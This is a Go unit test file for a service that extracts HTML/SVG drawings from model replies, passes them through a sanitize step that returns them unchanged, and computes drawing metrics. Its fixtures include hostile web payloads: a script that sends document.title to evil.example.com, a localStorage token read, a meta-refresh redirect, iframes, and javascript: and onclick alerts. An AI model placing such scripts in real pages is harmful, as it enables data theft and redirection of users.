//go:build unit

package service

import (
	"strings"
	"testing"

	"github.com/stretchr/testify/require"
)

func TestExtractIntelCheckDrawing(t *testing.T) {
	t.Run("从 html 代码块中抽取", func(t *testing.T) {
		reply := "好的，这是实现：\n\n```html\n<html><body><svg><circle r=\"1\"/></svg></body></html>\n```\n\n希望符合要求。"
		got, err := ExtractIntelCheckDrawing(reply)
		require.NoError(t, err)
		require.True(t, strings.HasPrefix(got, "<html>"))
		require.Contains(t, got, "<svg>")
		require.NotContains(t, got, "希望符合要求")
	})

	t.Run("多个代码块时取最长的一个", func(t *testing.T) {
		reply := "先看一个最小示例：\n```html\n<svg></svg>\n```\n完整版本：\n```html\n<svg><circle r=\"1\"/><rect/><path d=\"M0 0\"/></svg>\n```"
		got, err := ExtractIntelCheckDrawing(reply)
		require.NoError(t, err)
		require.Contains(t, got, "<circle")
	})

	t.Run("忽略非绘图代码块", func(t *testing.T) {
		reply := "先安装依赖：\n```bash\nnpm install\n```\n再看画作：\n```\n<svg><circle r=\"1\"/></svg>\n```"
		got, err := ExtractIntelCheckDrawing(reply)
		require.NoError(t, err)
		require.Contains(t, got, "<svg>")
		require.NotContains(t, got, "npm install")
	})

	t.Run("无代码块时抽取裸 html 文档", func(t *testing.T) {
		reply := "结果如下。<!DOCTYPE html><html><body><svg></svg></body></html> 完毕。"
		got, err := ExtractIntelCheckDrawing(reply)
		require.NoError(t, err)
		require.True(t, strings.HasPrefix(strings.ToLower(got), "<!doctype html"))
		require.NotContains(t, got, "完毕")
	})

	t.Run("最后兜底抽取裸 svg 片段", func(t *testing.T) {
		reply := "画作：<svg viewBox=\"0 0 1 1\"><circle r=\"1\"/></svg>"
		got, err := ExtractIntelCheckDrawing(reply)
		require.NoError(t, err)
		require.True(t, strings.HasPrefix(got, "<svg"))
	})

	t.Run("没有产物时报错", func(t *testing.T) {
		_, err := ExtractIntelCheckDrawing("抱歉，我无法完成这个任务。")
		require.Error(t, err)
	})
}

func TestSanitizeIntelCheckDrawingReturnsSourceUnchanged(t *testing.T) {
	tests := []struct {
		name   string
		source string
	}{
		{
			name:   "保留 iframe",
			source: `<html><body><svg></svg><iframe src="https://evil.example.com"></iframe></body></html>`,
		},
		{
			name:   "保留内联事件属性",
			source: `<html><body><svg><circle r="1" onclick="alert(1)"/></svg></body></html>`,
		},
		{
			name:   "保留网络请求脚本文本",
			source: `<html><body><svg></svg><script>fetch("https://evil.example.com?d=" + document.title);</script></body></html>`,
		},
		{
			name:   "保留本地存储脚本文本",
			source: `<html><body><svg></svg><script>const v = localStorage.getItem("token"); requestAnimationFrame(() => v);</script></body></html>`,
		},
		{
			name:   "保留 meta",
			source: `<html><head><meta http-equiv="refresh" content="0;url=https://evil.example.com"></head><body><svg></svg></body></html>`,
		},
		{
			name:   "保留外链地址",
			source: `<html><body><svg></svg><a href="https://evil.example.com">点我</a></body></html>`,
		},
		{
			name:   "保留 javascript 伪协议文本",
			source: `<html><body><svg></svg><a href="javascript:alert(1)">点我</a></body></html>`,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got, err := SanitizeIntelCheckDrawing(tt.source, 0)
			require.NoError(t, err)
			require.Equal(t, tt.source, got)
		})
	}
}

func TestSanitizeIntelCheckDrawingSizeLimit(t *testing.T) {
	source := `<html><body><svg><circle r="1"/></svg></body></html>`

	t.Run("超过上限时报错", func(t *testing.T) {
		_, err := SanitizeIntelCheckDrawing(source, 10)
		require.Error(t, err)
	})

	t.Run("上限为零表示不限制", func(t *testing.T) {
		got, err := SanitizeIntelCheckDrawing(source, 0)
		require.NoError(t, err)
		require.Contains(t, got, "<svg>")
	})
}

// TestSanitizeIntelCheckDrawingPipeline 串起抽取 → 原样保留 → 计算指标的完整链路。
func TestSanitizeIntelCheckDrawingPipeline(t *testing.T) {
	reply := "这是我的实现：\n\n```html\n" + drawingSampleSMIL + "\n```"

	extracted, err := ExtractIntelCheckDrawing(reply)
	require.NoError(t, err)

	sanitized, err := SanitizeIntelCheckDrawing(extracted, 0)
	require.NoError(t, err)

	metrics, err := ComputeDrawingMetrics(sanitized)
	require.NoError(t, err)
	require.True(t, metrics.HasSVG)
	require.True(t, metrics.HasTitle)
	require.True(t, metrics.HasDesc)
	require.Equal(t, 1, metrics.AnimatedTargets)
	require.True(t, metrics.HasMechanism(DrawingMechanismSMIL))
}
